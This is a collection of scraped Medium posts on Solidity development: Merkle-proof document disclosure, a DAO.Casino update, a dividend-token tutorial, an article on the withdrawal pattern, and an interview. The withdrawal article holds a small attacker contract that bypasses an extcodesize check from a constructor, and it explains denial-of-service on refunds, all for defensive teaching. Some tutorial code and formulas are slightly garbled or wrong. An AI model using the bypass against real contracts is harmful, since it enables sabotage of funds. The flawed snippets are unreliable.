passport, or her complete birth record.Alice can say these documents contain a certain date of birth, but Bob cannot independently prove that Alice is telling the truth unless she reveals one of these documents in every detail, which Alice doesn\u2019t want to do.In fact, Alice can\u2019t prove anything without selecting one of the documents and disclosing it to Bob, in its entirety. Again, Alice doesn\u2019t want to do that.How can Alice prove she is telling the truth about a single field? How can that be done without migrating all of the important fields to expensive on-chain storage in the registry contracts?Solution:Consider a simple JSON object{  \u201cname\u201d: \u201cAlice\u201d,  \u201cdateOfBirth\u201d: \u201c01/01/1984\u201d,  \u201cplaceOfBirth\u201d: \u201cOceana\u201d}Alice will prove that the document contains \u201cdateOfBirth\u201d: \u201c01/01/1984\u201d without disclosing the entire JSON object by using something called a Merkle Proof.A Merkle Proof proves the existence of a value within a dataset, which is exactly what we want. If you\u2019re not familiar with Merkle Proofs, have a look over here: https://www.quora.com/Cryptography-How-does-a-Merkle-proof-actually-workFor a Merkle Proof to work, we need a Merkle Tree. A Merkle Tree recursively hashes pairs of values until finally there is only one hash left, known as the Merkle Root. Conveniently for us, we start with pairs of keys and corresponding values, which is actually two things.Alice proves the birthday claim is authentic by providing the root hash (document ID) and two more\u00a0hashes.In case the proving process isn\u2019t clear, Alice wants to prove that \u201cdateOfBirth\u201d: \u201c01/01/1984\u201d exists in an authentic document.Starting with that pair, anyone can derive the hash of the two values she says are there (CD).Alice also supplies AB as part of her proof.With this extra information, anyone can compute ABCD.All that\u2019s missing is EF, so Alice supplies that as well.Now, anyone can compute the root hash, which is the unique identifier for the document in the on-chain registry.The registry can confirm that document ID (Merkle Root) is an authentic document.So, Alice has convincingly demonstrated that there is a certain key:value pair in a verifiably authentic document.Since we know that hashes are one-way functions, we know Alice could only produce such a formulation by working from knowledge of the contents of the original document. There is no known economically viable method of imitating this sort of mathematical demonstration of knowledge of the contents of the document.Consider what would happen if the topology and values of the Merkle Tree was part of the JSON object itself. Simplified:{  \u201cmerkleTree\u201d: [    \u201c0x123\u2026\u201d,    \u201c0xabc\u2026\u201d,    \u201c0x456\u2026\u201d,    \u201c0xdef\u2026\u201d],  \"name\u201d: \u201cAlice\u201d,  \"dateOfBirth\u201d: \u201c01/01/1984\u201d,  \u201cplaceOfBirth\u201d: \u201ceurasia\u201d}The root node is a suitable key to include in a blockchain because it sums up all of this in a single 32-byte word. It takes up the same amount of space as a simple hash of the object, but it\u2019s more useful.Since the correct construction of a Merkle Tree is self-evident given a certain set of data, it can be solved on-the-fly. There is no need to actually stuff the Merkle Tree details inside the objects.The main requirement is to organize the details you want to be separately and selectively disclosable into Merkle Trees and rely on the Merkle Root instead of simple document hashes when using smart contracts to authenticate off-chain objects.Now, Alice can construct a Merkle Proof showing that there is a field:value pair \u201cdateOfBirth\u201d: \u201c01/01/1984\u201d in the document with a certain ID. Importantly, she does not need to reveal the entire contents of the document to the observer. For the observer, it\u2019s enough to see that it is a legitimate piece of ID, confirmed by a proper authority (which is a smart contract), and the data set does indeed contain the one piece of information (key:value pair) Alice wishes to disclose.Hashes are one-way functions, so a Merkle-Proof doesn\u2019t leak or even hint at the contents of the rest of the document.Encrypting the Source\u00a0DocumentAstute readers will have noticed that up until now, Alice\u2019s document has been exposed (See? It\u2019s right up there ^). Consider what happens when the document is encrypted so that only Alice can decrypt it, or protected so only Alice can see it.Alice herself has no problems constructing Merkle Proofs for any key:value pair she cares to disclose to others. Observers can see that she is working from authentic source documents and providing Merkle Proofs for everything she says. Even so, document contents are out of reach to others unless Alice decides to reveal them.In effect, Alice would be proving:\u201cI have a birth certificate with this unique identifier. You can confirm authenticity by checking the birth registry smart contract yourself. I have access to the details of this birth certificate because it belongs to me. On this birth certificate, the \u201cdateOfBirth\u201d is \u201c01/01/1984\u201d. Here\u2019s a Merkle Proof. Your own mathematicians will confirm there is no viable alternative explanation for its existence.\u201dIn summaryThis method facilitates the efficient storage of objects of any size and facilitates the selective disclosure of discrete details of the contents of such objects.This method is agnostic about storage infrastructure and blockchain of choice. We use blockchain smart contracts to register authentic documents, describe document origins, provide the history of the issuance process, the signers, and so on. Merkle Roots can be used as unique identifiers for documents or document versions or as attributes of documents known by some other key.We use inexpensive persistent data stores to store the bulky details. We store the Merkle Root\u2019s of authentic documents on blockchains instead of document hashes. This method supports selective disclosure of parts of the objects at the key:value pair level.This method is compatible with any encryption or access-control scheme aimed at keeping the source document out of public view. The only requirement is that the prover must have access to correct information. In the simplest scenario, Alice can see the entire document, so she can compute the Merkle Tree and construct proofs of its contents. It\u2019s not even strictly necessary that Alice can see the whole document, provided she has the extra node hashes she needs for her proofs.OnwardThis method potentially allows smart contract logic to access state information stored off-chain. A state change (or other logic) can be contingent on the user providing a Merkle Proof of a value that is not, itself, stored in the expensive smart contract state.In Ethereum (Solidity), it might look something like this (pseudo):modifier only18Plus(uint dateOfBirth, bytes32[] proof) { require(isMerkleProof(\u201cdateOfBirth\u201d, dateOfBirth, proof)); require(dateOfBirth <= eighteenYearsAgo); _;}function forAdultsOnly(uint dateOfBirth, bytes32[] proof) public only18Plus \u2026The real world is not quite so simple but it is interesting to consider that contract logic could be conditional on presenting proofs of external states.UpdateAs luck would have it, Open Zeppelin now has a Merkle Proof example, here: https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v2.2.0/contracts/cryptography/MerkleProof.solRob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.", "responses": "1"}, {"title": "Dao.Casino Dev Update\u200a\u2014\u200aMarch 20th 2018: Solidity development, DC-Dev, Bankroller refactoring/audit, lottery, slots and business development", "author_name": "DAO.Casino Team", "link": "https://medium.com/@dao.casino/dao-casino-dev-update-march-20th-2018-solidity-development-dc-dev-bankroller-47338e337b3?source=search_post", "post_date": "Mar 20, 2018", "readtime": "4 min read", "upvotes": "130", "content": "Dao.Casino Dev Update\u200a\u2014\u200aMarch 20th 2018: Solidity development, DC-Dev, Bankroller refactoring/audit, lottery, slots and business developmentDAO.Casino TeamBlockedUnblockFollowFollowingMar 20, 2018Welcome to the latest article in the DAO.Casino Dev Update series. As you know, these updates are provided every two weeks to keep our community informed about the team\u2019s progress. We are always open to any feedback you have, so please don\u2019t hesitate to share! The easiest way to do this is via our Telegram group, so head over there to join the discussion. Now, let\u2019s get to our latest developments.Updated RoadmapSmart Contract DevelopmentNow that our Solidity developer Alexander Davydov has finished preparing for the core contacts audit, he has switched his efforts back to the development of smart contracts. He has now integrated the DAO.Casino slots contract with our core contracts, which has brought together the funds distribution functions for referrers, bankrollers and developers. He has also connected the Signidice random generator to the Slots smart contract.DC-DevOur javascript developers Alex Stepanchenko and Ilya Shvyrialkin are still working hard on primary development tasks for the DAO.Casino blockchain protocol. Together they have developed API support for distributing \u2018test BET tokens\u2019 which will be supplied to our community of game testers allowing them to get playing!Bankroller refactoring and\u00a0auditWe have now completed the refactoring work for our Bankroller architecture. This is a key component for DAO.Casino blockchain protocol implementation and one of the main tools to be used by external developers when building games on the DAO.Casino blockchain protocol.As we say\u2026 after refactoring, comes an audit. We are currently finishing the preparations for our Bankroller-core, DC-Library and Dice Game audit and will notify the community as soon as this is sent through to our auditors for testing.Bankroller ArchitectureLotteryFollowing on from our earlier Dev Update, we are sticking to the development schedule for our Lottery development. A lot of progress has been made by our team and we now have a signed contract with design company for the remaining design work.We have now collected all required data, to form a standalone research in relation to funds distribution for Lottery. Our research covers funds distribution between bankrollers, jackpot winners, game owners and referrers. We have also implemented jackpot and powerplay functions into our Lottery smart-contract and, with the help of truffle framework, we have managed to maintain the smart contract deployment process.Finally, several bugs have been fixed in the Lottery smart contract to allow for it to work smoothly during testing.SlotsMuch of the same for Slots! We have also completed development of the required reward logic and dispute resolution for the Slots smart contract, as well as the basic drafts for logic.js (including a check of drums, bonus games and wild symbols) and a data-generator for testing. And now we are setting a task to integrate our bankroller.There is still a lot of progress to be made on our Slots game, so we are looking to outsource some of our development tasks for this game to help speed things along. If you have the skills and qualifications to help us out here, or know someone that does, please contact us via our telegram channel and we\u2019ll get back to you ASAP. We appreciate any help that can be provided.Business DevelopmentCollaboration is an important part of pretty much all successful businesses. It is even more crucial for business to business projects, such as DAO.Casino. Last week we announced our very first partnership of the year by introducing you to gaming platform and game developer\u200a\u2014\u200aDiceyBit.Our management team has now turned its focus toward looking for, and successfully negotiating with, potential new partners. We are making good progress here and new partnerships with those currently operating in the crypto-games world are reaching final negotiations. As soon as contracts are signed, we will be making more announcements to the community.As always, we will be back in two weeks with more development updates. So stay tuned, and let\u2019s disrupt the online gaming industry together!DAO.Casino Essential LinksWebsite: https://dao.casinoPrototype: https://platform.dao.casino GitHub: https://github.com/daocasinoEmail: team@dao.casinoWhite Paper:https://github.com/DaoCasino/Whitepaper/blob/master/DAO.Casino%20WP.mdTelegram: https://t.me/daocasinoFacebook: https://www.facebook.com/Dao.casino/Twitter: https://twitter.com/daocasinoBlog: https://medium.com/@dao.casino/YouTube: https://www.youtube.com/channel/UCkggi9VnPJ0qUzfj7h70-pQ", "responses": ""}, {"title": "How to Build a Dividend Token With\u00a0Solidity", "author_name": "Gaurav Agrawal", "link": "https://medium.com/crowdbotics/how-to-build-a-dividend-token-with-solidity-81ae3bf3fe72?source=search_post", "post_date": "Nov 14, 2018", "readtime": "5 min read", "upvotes": "49", "content": "How to Build a Dividend Token With\u00a0SolidityTroubleshooting common challenges such as rounding errors, sending duplicate dividends, gas optimization, unfixed total supply, and\u00a0more.Gaurav AgrawalBlockedUnblockFollowFollowingNov 14, 2018Recap: In the previous tutorials we build a burnable token, we also learned and build a capped token, and make that token time sensitive. To learn more, check out our previous tutorials. In this tutorial, we will build a dividend token.Prerequisite:Understanding of basic concepts of solidityUnderstanding of ERC20 standardWhat is dividend\u00a0token?A dividend is the distribution of reward from a portion of company\u2019s earnings and is paid to a class of its shareholders. So a token which pays out profits to its investor as dividends is a dividend token. There are multiple ways to pay the dividend in the token economy. Today we will discuss how to build this feature into a smart contract.Why use dividend\u00a0Token?Dividends are standard practice to distribute earnings to investors. Dividends also create a passive income source for your investors. This will attract long-term investors and create incentives for holding tokens.Problems we tackle in our Dividend token\u00a0contractWe will tackle below main problems which we usually face while building a dividend token.Rounding error problem\u200a\u2014\u200aWhen we work with multiple account transfers and divide dividends, there can be a case where we lose tokens while dividing for investors. This will be solved using a bigger multiplier so we don\u2019t get fraction values.Getting a dividend multiple times\u2014 We also need to take care that someone can\u2019t get a dividend more than one time. This case can happen when Bob gets the dividend on his tokens, then transfer tokens to another account and gets dividends again. This will be solved updating dividends for sender and receivers before any transfer.Gas optimization\u200a\u2014\u200aThere are multiple ways to update dividends for investors, one way is to write a loop and update dividends to investors account but this design has a problem to run out of gas. We can optimize it by using a different design introduced by Nick Johnson.Unfixed Total Supply\u200a\u2014\u200aWe will also create a token where total supply is not fixed and get increased when dividends get paid.DividendToken.solOur code:SourceNow let's breakdown our dividend Token code.    string public name = \"Dividend Token\";    string public symbol = \"DIV\";    uint8 public decimals = 0;      uint256 public totalSupply_ = 1000000;    uint256 totalDividendPoints = 0;    uint256 unclaimedDividends = 0;    uint256 pointMultiplier = 1000000000000000000;    address owner;        struct account{         uint256 balance;         uint256 lastDividendPoints;    }    mapping(address => account) public balanceOf;name\u200a\u2014\u200aName of our tokesymbol\u200a\u2014\u200aOur token symboldecimal\u200a\u2014\u200aWe are using 0 decimal for simplicitytotalSupply_\u200a\u2014\u200aTotal supply of our tokentotalDividentPoints\u200a\u2014\u200aTotal dividend which is given till nowunclaimedDividends\u200a\u2014\u200aTrack unclaimed dividends.pointMultiplier\u200a\u2014\u200a10\u00b9\u2078 as point multiplier to tackle rounding errorsowner\u200a\u2014\u200aOwner address of our smart contractaccount\u200a\u2014\u200aStructure using to track balance and dividendsbalanceOf\u200a\u2014\u200aMapping for address and account(above structure) to track accounts.Dividend LogicNow let's dive into our main dividend logic.modifier updateDividend(address investor) {    uint256 owing = dividendsOwing(investor);    if(owing > 0) {        unclaimedDividends = unclaimedDividends.sub(owing);        balanceOf[investor].balance =             balanceOf[investor].balance.add(owing);        balanceOf[investor].lastDividendPoints =  totalDividendPoints;        }     _;    }function dividendsOwing(address investor) internal returns(uint256){       uint256 newDividendPoints = totalDividendPoints.sub(balanceOf[investor].lastDividendPoints);        return (balanceOf[investor].balance.mul(newDividendPoints)).div(pointMultiplier); }function disburse(uint256 amount) onlyOwner public {    totalDividendPoints = totalDividendPoints.add((amount.mul(pointMultiplier)).div(totalSupply_));    totalSupply_ = totalSupply_.add(amount);    unclaimedDividends =  unclaimedDividends.add(amount); }updateDividend\u200a\u2014\u200aThis will calculate dividends owed by an account. It will call dividendsOwing method, which we will see in a minute. After finding out what dividends owe to an account, we will update our unclaimedDividends variable and then we will update investor\u2019s account balance and lastDividendPoints.We will use this modifier with every transfer method for both sender and receiver.dividendsOwing\u200a\u2014\u200aThis function has our main logic to calculate dividends. it will calculate dividends using the following logic.new dividend = totalDividendPoints - investor's lastDividnedPoint investor's dividend = ( investor's balance * new dividend ) / points multiplierYou can see we are calculating dividends based on investor\u2019s balance. This function will only be called by the contract owner.disburse\u200a\u2014\u200aThis function will be called to pay dividends to the contract which will increase totalDividendPoints\u00a0, totalSupply_ and unclaimedDividends. We are using pointmultiplier (10\u00b9\u2078) to steer clear of a rounding error.totalDividendPoints += (amount * pointMultiplier ) / totalSupply_The Basic Formula for the dividend for an investor according to his/her balance is-investor's dividend = Total Dividend / investor\u2019s balanceOther parts of the contract are implementing with standard ERC20 methods. Which we will not discuss in this tutorial.Testing Dividend\u00a0ContractNow let\u2019s write a test case where we will see if above is working properly.it('dividend Test' , async() => {   await this.tokenInstance.transfer(web3.eth.accounts[1],100000, {from : web3.eth.accounts[0]});  await this.tokenInstance.disburse(100000);  await this.tokenInstance.transfer(web3.eth.accounts[2],100000, {from : web3.eth.accounts[1]});  const investor_1_balance = await this.tokenInstance.balanceOf(web3.eth.accounts[1]);  const investor_2_balance = await this.tokenInstance.balanceOf(web3.eth.accounts[2]);  const totalSupply = await this.tokenInstance.totalSupply_();  assert.equal( totalSupply, 1100000);  assert.equal(investor_1_balance, 10000);  assert.equal(investor_2_balance, 100000);  })Below are the steps which are getting performed by the test case.investor_0 \u2192 100000 tokens \u2192 investor_1100000 tokens were given as dividends to the contractinvestor_1 \u2192 100000 tokens \u2192 investor_2investor_1 balance should be 10000 tokens (This is the dividend amount because the account has 100000 tokens when the dividend was given)investor_2 balance should be 100000 tokens (account should not have dividends tokens because there were no tokens when the dividend was given)Total supply should increase to 1100000 (after getting 100000 tokens as a dividend)ConclusionSo, today we created a dividend token. We learned how to tackle a rounding error problem and a multiple dividend problem. There are multiple ways to create dividends for your investors in the token economy. Proof of stake protocol also has similar properties, which we will discuss in future.Notes & suggestions-Do not use this code in production, this code is for educational purpose. If you don\u2019t understand something or want to learn something else let us know in comments. You can view full code in my GitHub repository.Starting a new blockchain project, or looking for a Solidity developer?Crowdbotics helps business build cool things with Solidity (among other things). If you have a blockchain project where you need additional developer resources, drop us a line. Crowbotics can help you estimate build time for given product and feature specs, and provide specialized Solidity developers as you need them. If you\u2019re building with Solidity, check out Crowdbotics.", "responses": ""}, {"title": "The Solidity Withdrawal Pattern", "author_name": "Rob Hitchens", "link": "https://blog.b9lab.com/the-solidity-withdrawal-pattern-1602cb32f1a5?source=search_post", "post_date": "Mar 26", "readtime": "9 min read", "upvotes": "165", "content": "The Solidity Withdrawal PatternRob HitchensBlockedUnblockFollowFollowingMar 26Watch out for stranger danger.Ethereum protocol assures us that transactions are atomic. That is, they either succeed completely or they don\u2019t do anything (important) at all. Sounds great, right?One of the more challenging aspects of adapting to this environment is internalizing non-obvious risks. We need to learn about new kinds of danger and form habits that will help us avoid trouble.This post will reveal various ways that naive assumptions can get a contract into trouble and show you how vulnerable contracts can be interfered with. The author will suggest some habits you can form to protect yourself.Let us consider a naive contract. Let\u2019s just consider a situation where funds need to be distributed to more than one account. It could be an air drop, a dividend or something else. Let\u2019s say everyone has contributed to a crowd funding project but the funding goal wasn\u2019t reached and now everyone should get their money back.The Naive\u00a0Wayfunction sendRefunds() public onlyOwner returns(bool success) {    for (i=0; i<funders.length; i++) {        funders[i].transfer(contributionAmount);     }    return true;}Great. For every funder, return the contribution (Let\u2019s just say the amount of the contribution was the same for everyone). Only the owner is allowed to make that happen.I set most application details aside so we can focus on what is wrong with this approach to a seemingly simple task.Serious ProblemsThe serious problems aren\u2019t obvious.On a deep design level, I would argue that the contract doesn\u2019t assure anyone they will get their money back. Only the owner can initiate the function, but they are distraught, possibly in hiding, possibly irresponsible, possibly have lost the only signing key that can make it happen. The owner is a single point of failure and this pattern suggests adherence to server-centric thinking\u200a\u2014\u200aonly a privileged user should be able to initiate a mass distribution of funds.Such thinking misses the point of a distributed system and the assurances that are possible with a smart contract. If the people are entitled to a refund, then there should be no possibility of interference in that process.Another error is the unbounded for loop. It will surely run out of gas at some maximum number of funders making it impossible for anyone to recover the funds. That is not good. It\u2019s an anti-pattern. If the foregoing claim sounds mysterious or inadequately-explained, see Getting Loopy with Solidity. Suffice it to say that an attacker who wishes sabotage the refund process would merely need to send a large number of trivially small contributions such that cost of executing the loop exceeds the block gas limit.A more subtle\u00a0problemSuppose Alice and Bob are the two funders and for some reason the campaign is limited to two funders. Further suppose that the developer is a purist and wants to avoid using a loop. The function could be re-imagined in a more idiomatic fashion:function sendRefunds() public onlyOwner returns(bool success) {    alice.transfer(amount);    bob.transfer(amount);    return true;}What could go wrong, right? There is no conditional logic. We know transactions are atomic. There are three simple steps to complete. Can you imagine a scenario where no one gets paid (other than the owners not playing ball as mentioned)? Take your time. The next bullet is a spoiler.What would happen if Bob rejected the transfer? Think about it. Take your time.Would Alice get paid? Would the transaction succeed or fail? Take your time.Spoiler alertIf Bob rejects the transfer, the transfer method reverts and this causes the entire transaction to fail, meaning the sender (signer, owner) gets an error. The transaction is atomic. It\u2019s an all-or-nothing proposition, right? So, if any participant rejects the transfer then no participant gets paid. Said another way, if one fails then they all fail.Why would that happen? An intuitive way to look at this is to assume that all accounts want and accept all funds at all times because receiving money is always desirable. That\u2019s naive. That would be making assumptions about what the participants find desirable. If they find it more desirable to interfere with the refund process and the contract allows it, then we can expect that to happen.How?Fallback functions are not\u00a0payableContracts have fallback functions that run when such transfers are received. By default they look roughly like:function () public {}Notably, the default fallback is not payable, so it will reject all funds. It\u2019s good practice for contracts to reject all unexpected funds. Contracts usually have accounting needs to attend to and they don\u2019t want these \u201cout of the blue\u201d transfers. By default, a contract will reject the transfer. This is deadly for the naive contract if it happens to accept funds from a contract. It can\u2019t work unless everyone cooperates. By extension, it can\u2019t work if even one funder is a contract with the default setup.If trouble can happen by accident, trouble can happen on\u00a0purposeThe possibility of an accident also means there is a possibility of a denial-of-service attack. An attacker might send a small contribution to a fund-raiser, take its place among the funders and DoS the refund process. That\u2019s trivially simple (and possibly very cheap) sabotage. An attacker could tie up considerable funds and cause reputational damage to the project team. The situation probably wouldn\u2019t be repairable. Indeed, a determined attacker could jam up the refund, effectively holding the funds hostage, possibly for ransom. Yikes!Maybe we should disallow contractsI feel some questionable ideas are worth mentioning. One might look at this and think \u201cAh, Ha! All I need to do is prohibit contracts from participating.\u201d In my view this idea defeats the idea of reliable modular code that interacts to form more complex systems. Why should you want your contract to discriminate on this basis? Is there no valid case where the client (msg.sender) is a contract? What about autonomous organizations? What about multi-signature wallets?One might see this looks promising: https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contractAlas, there is a catch. If an attacker calls the contract from a constructor this method will return false (not a contract) because the caller has no bytecode, yet. It has no bytecode yet because the constructor hasn\u2019t reached that step, yet. This, and the even cheaper extcodehashmethod, doesn\u2019t reliably identify contracts so is not a recommended practice.The idea is simple enough:pragma solidity 0.4.25;contract Victim {    contract Victim {    // this is the example code that \"detects\" a contract.      function isContract() public view returns(bool){        uint32 size;        address a = msg.sender;        assembly {            size := extcodesize(a)        }        return (size > 0);    }}contract Attacker {        bool public iTrickedIt;    Victim v;    // the detection method doesn't work in the case of constructor        constructor(address _v) public {        v = Victim(_v);        // address(this) doesn't have code, yet        iTrickedIt = !v.isContract();    }}You can play around with that in Remix.Deploy a VictimDeploy an Attacker with the Victim addressCheck iTrickedItTrue!It was fooled into thinking the Attacker is not a contract. So, rather than preventing interactions with contracts, this effort to avoid contracts simply instructs attackers to launch their attacks from constructors. Perhaps even worse, attackers will know we are concerned about interacting with contracts, and that transmits a strong hint about where to look for a vulnerability.Stranger danger!Maybe we should check the\u00a0sendOne could dispense with the transfer method and use send instead. It returns a false instead of revert in the case that the value transmission fails. You get something like this:function sendRefund() public onlyOwner returns(bool success) {    if(!alice.send(amount)) {        // now deal with the failure case    }}What exactly are we supposed to do? If Alice won\u2019t accept the funds, then we have some messy accounting to deal with. If we are interested in thoroughness and fairness, then we have to give Alice a way to withdraw those funds.Withdrawal functionWe can make a function for funders to come and claim their funds. This works equally well for externally owned accounts and contracts. It has the added benefit that the beneficiary of the transaction pays for the gas.Our job is to know how much money is owed. Let\u2019s set some details aside for a moment and just look at the basic idea. In this context, msg.sender is the account asking for their funds. We will check if the request is acceptable and then proceed.function claimRefund() public {    require(balance[msg.sender] > 0);    msg.sender.transfer(balance[msg.sender]);}Never talk to more than one untrusted contract at a\u00a0timeNotice that the claimRefund() function snippet is only concerned with the msg.sender, that is, who is asking for money right now? Is the request acceptable? Does the contract owe them funds? If so, do it.It doesn\u2019t rely on the owner doing what the funders expect them to do. The contract relies on its own logic, which is the logic of the agreement. There is no need for the owner to confirm what is already apparent to all observers.It doesn\u2019t rely on the other parties not interfering. No one aside from the msg.senderabout which each transaction is concerned is involved in the logic.Those are good safety habits. By compartmentalizing interactions with one untrusted party at a time, we make it very hard for users to interfere with others. This approach resolves the central issues we discovered in the naive contract.Unlimited interactions with trusted contracts. One untrusted contract at a\u00a0timeYou can create vast systems of trusted contracts that talk to each other, and that\u2019s okay when you use access control to ensure that the msg.senderis something trustworthy. In this context trusted means there is no doubt about its intentions, what it does or how it works. In the examples, msg.sender could be anyone or anything, so we don\u2019t trust it. One of those \u201cuntrusted\u201d parties at a time. That\u2019s our budget.We can\u2019t safely open another channel of communication with another \u201cuntrusted\u201d contract within a single transaction. While it may be difficult to reason about precisely how a potential attack might unfold, talking to more than one untrusted contract at a time almost always creates vulnerabilities.Withdrawal PatternAstute readers will have noticed that the subject of msg.sender\u2019s balance was rather glossed over. How does that work in practice?The first order of business is to create a data structure that will hold the balance for every possible user. Something like:mapping(address => uint) public balances;Great. As the funds arrive:balances[msg.sender] += msg.value;As the funds are returned:balances[msg.sender] -= amountToSend;Of course, you have to actually transfer funds and you have to make it re-entrance safe, so we will adjust the balance before we do the transfer. Altogether, something like:function withdrawFunds(uint amount) public returns(bool success) {       require(balances[msg.sender] >= amount; // guards up front    balances[msg.sender] -= amount;         // optimistic accounting    msg.sender.transfer(amount);            // transfer    return true;}RecapIt\u2019s not safe to talk to more than one untrusted contract at a time. The withdrawal pattern nicely avoids the necessity of doing so. Accounting will vary on a case-by-case basis. Suffice it to say that contracts should be aware of their liabilities to each account. For example, our crowdfunding contract would determine that the deadline has passed and the goal has not been reached, and therefore it should start allowing refunds.If we\u2019ve done the accounting, which we should, and if we\u2019ve given everyone a way to claim their funds, which we should, then there is often no need for the naive approach that tries to push transfers to other accounts. In essence, that is what developers mean when they say we should use a \u201cwithdrawal pattern\u201d or favoring \u201cpull\u201d over \u201cpush\u201d.Internalizing and practicing this approach habitually is an important aspect of the safe handling of funds in Solidity. As a reminder, production code candidates should always endure rigorous peer review. Problems might not be obvious. The withdrawal pattern is one way you can eliminate obvious vulnerabilities.Rob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.\u2014\u200a\u2014\u200a\u2014If this has sparked your interest and you want to see more from B9lab why not look at our free Ethereum course. Or dive in to mentored learning with Rob as an expert instructor with the B9lab ONE subscription\u200a\u2014\u200aaccess to all our online course for up to a year!Become a certified multi-framework developer with B9lab\u2019s one-on-one support and mentoring from expert instructors who will actually review your code and help you refine it.", "responses": ""}, {"title": "Syntax, Scams and Solidity: An Interview with Hans\u00a0Svensson", "author_name": "\u00e6ternity", "link": "https://blog.aeternity.com/syntax-scams-and-solidity-an-interview-with-hans-svensson-ef666fae2d58?source=search_post", "post_date": "Jan 10", "readtime": "4 min read", "upvotes": "212", "content": "Syntax, Scams and Solidity: An Interview with Hans\u00a0SvenssonHans shared his view on functional programming, consensus, and whether or not blockchain will actually change the\u00a0world.\u00e6ternityBlockedUnblockFollowFollowingJan 10With more than 15 years experience in Erlang programming, Hans Svensson in a specialist in model checking for concurrent programs. He has implemented CAN and LIN protocols and has worked as a QuickCheck expert, testing SSL, Riak, automotive protocols, telecom protocols and various other distributed systems. He has implemented the semantics of Erlang and knows the VM corners. As the author of multiple libraries with concurrency as the unifying theme, he holds a PhD in testing, model checking and verification of Erlang programs. Hans brings his laid back yet dedicated nature to the \u00e6ternity project and is known by many for his desire and ability to follow through. Recently, we sat down with him to ask about his view on functional programming, consensus, and whether or not blockchain will actually change the world.What brought you to the\u00a0team?Coming from an academic background, having worked with distributed systems and having taught courses in cryptography, it was natural for me to have at least a brief interest in the emergence of blockchain technology. However, for several years I was too busy with work and family to explore it in detail.This changed when I was introduced to the \u00e6ternity project. It seemed like an amazing opportunity to build a next generation blockchain in Erlang.What interests you most about blockchain?I find the decentralized nature very interesting.I like the idea that the blockchain just exists; no one is \u201crunning it\u201d.Yes of course there is a community, and most changes it experiences include some version of consensus. But, at the end of the day, it is the code itself that a majority of the participants run that defines the chain.Do you think that blockchain has the potential to change the\u00a0world?This is a question that I often get from friends when they hear that I am currently involved in a blockchain project. I usually tell them that I think a few\u200a\u2014\u200amaybe a handful\u200a\u2014\u200aof the existing blockchains will persist and be really useful building blocks in future technology. However, I am not so sure it will, in itself, change the world. In a sense, it might do so because it enables some groundbreaking service to be built upon it. But how this might happen remains to be seen.What is your favorite thing about Erlang as a programming language?I can only pick one? For me, it has to be its modern and succinct syntax\u2026 Just kidding! But seriously, apart from its unrivaled concurrency model, what I normally fancy most is that I can be really productive. The language being functional and dynamically typed also helps a lot. Having written lengthy imperative programs and battled the Haskell type-checker, this feature is very valuable to me.What is the biggest challenge of your work at the\u00a0moment?The biggest challenge for \u00e6ternity is uptake. Sure, we can develop and improve lots of things. But we need to educate people and get them to understand, and love, the concepts that we already have. Our contract language is an excellent example of this. It is different compared to Solidity for instance. But it is different for a reason and, if you ask me, it is different in a very good way. There is much less chance to shoot yourself in the foot with Sophia, but you can still do it if you really want to.In the end I like that we have made a safer language without limiting its expressiveness!What advice would you give someone about this technology?This business is full of paranoid people: people who are very quick to call something a scam as soon as they see anything that they don\u2019t fully understand. Probably for good reasons, there have already been too many dodgy projects around. But my advice would be to take three deep breaths, make sure you understand what you are looking at, and make your own decisions about things.Outside of work, how might a friend describe your personality?Some friends would say I care a bit too much about football, but it is nice to have something non-technical to focus on from time to time.\u00a0;)", "responses": ""}, {"title": "Arrays in\u00a0Solidity", "author_name": "Aventus Network", "link": "https://blog.aventus.io/arrays-in-solidity-788350f55ce5?source=search_post", "post_date": "Jul 20, 2018", "readtime": "6 min read", "upvotes": "209", "content": "Arrays in\u00a0SolidityAventus NetworkBlockedUnblockFollowFollowingJul 20, 2018This is the second technical blog on Solidity from Alex Pinto, a recent addition to our blockchain engineering team. You can read his first post on Working with Strings in Solidity.", "responses": ""}, {"title": "Creator of Solidity joins Slock.it Team as\u00a0Advisor", "author_name": "Stephan Tual", "link": "https://blog.slock.it/creator-of-solidity-joins-slock-it-team-as-advisor-76b77d0aa459?source=search_post", "post_date": "Dec 15, 2015", "readtime": "", "upvotes": "9", "content": "Creator of Solidity joins Slock.it Team as\u00a0AdvisorStephan TualBlockedUnblockFollowFollowingDec 15, 2015We\u2019re delighted to announce that Dr. Christian Reitwie\u00dfner, the creator of the Ethereum smart contract language Solidity, is joining the Slock.it team as Advisor.Solidity is a high-level language with a syntax similar to that of JavaScript and is designed to compile to code for the Ethereum Virtual Machine. It\u2019s at the core of every Dapp, and makes it easy to create contracts for voting, crowdfunding, gaming, blind auctions, multi-signature wallets and more.Christian has a PhD in Computational Complexity Theory (don\u2019t worry, I had to look that one up, too) and is passionate about the power of cryptography.Prior to joining Ethereum, Christian worked for Tom Tom leading a team responsible for analysing road traffic data and taking it into account in routing algorithms on personal navigation devices.Christian shares our keen enthusiasm for open source software being made available to everyone\u200a\u2014\u200aa fundamental pillar of the work we do here at Slock.it.Welcome, Christian!", "responses": ""}, {"title": "", "author_name": "Dave Kajpust", "link": "https://medium.com/@davekaj/if-you-want-to-learn-about-smart-contract-technologies-you-should-focus-on-ethereum-and-solidity-ef98de784919?source=search_post", "post_date": "Mar 1, 2018", "readtime": "", "upvotes": "71", "content": "Dave KajpustBlockedUnblockFollowFollowingMar 1, 2018If you want to learn about smart contract technologies, you should focus on ethereum and Solidity. Solidity has great documentation. Use https://remix.ethereum.org/ to quickly test solidity code in a browser IDE.Then, once you get the hang of smart contracts, start developing dApps with the truffle suite http://truffleframework.com/\u00a0. They are making it amazingly simple to develop dApps on ethereum. Compared to a year ago, it is so much easier to be a developer of smart contracts with the truffle framework.", "responses": ""}, {"title": "Ethernaut Lvl 17 Locked Walkthrough: How to properly use (and abuse) structs in\u00a0Solidity", "author_name": "Nicole Zhu", "link": "https://medium.com/coinmonks/ethernaut-lvl-17-locked-walkthrough-how-to-properly-use-structs-in-solidity-f9900c8843e2?source=search_post", "post_date": "Sep 17, 2018", "readtime": "4 min read", 